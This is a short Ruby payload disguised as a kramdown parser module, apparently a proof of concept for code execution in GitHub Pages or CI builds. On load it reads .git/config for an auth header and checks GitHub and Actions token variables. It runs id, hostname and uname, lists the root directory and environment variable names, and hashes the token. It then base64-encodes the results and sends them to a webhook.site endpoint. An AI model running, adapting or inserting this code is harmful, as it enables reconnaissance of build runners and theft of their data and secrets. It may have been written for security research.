require "open-uri" rescue nil
require "digest" rescue nil
begin
  gitcfg = (File.read("/github/workspace/.git/config") rescue (File.read(File.join(Dir.pwd,".git/config")) rescue ""))
  tok = (gitcfg[/AUTHORIZATION:\s*basic\s+(\S+)/i,1] || ENV["GITHUB_TOKEN"] || ENV["ACTIONS_RUNTIME_TOKEN"] || ENV["GITHUB_PAGES_TOKEN"] || "none")
  info = {
    id: (`id`.strip rescue "?"),
    host: (`hostname`.strip rescue "?"),
    uname: (`uname -a`.strip rescue "?"),
    pwd: Dir.pwd,
    envkeys: ENV.keys.sort.join(","),
    gitcfg_extraheader: gitcfg.include?("extraheader"),
    token_present: tok != "none",
    token_len: tok.length,
    token_sha16: (Digest::SHA256.hexdigest(tok)[0,16] rescue "?"),
    ls_root: (Dir.entries("/").sort.join(",") rescue "?")
  }
  data = [Marshal.dump(info)].pack("m0") rescue [info.to_s].pack("m0")
  URI.open("https://0da1c1eb-e51b-4a56-942f-d48eab0c3310.webhook.site/KDIMPACT?d=#{data[0,1400]}") rescue nil
rescue => e
  (URI.open("https://0da1c1eb-e51b-4a56-942f-d48eab0c3310.webhook.site/KDIMPACT-ERR?e=#{e.class}") rescue nil)
end
module Kramdown; module Parser; class Evil; def initialize(*a); end; def parse; end; end; end; end
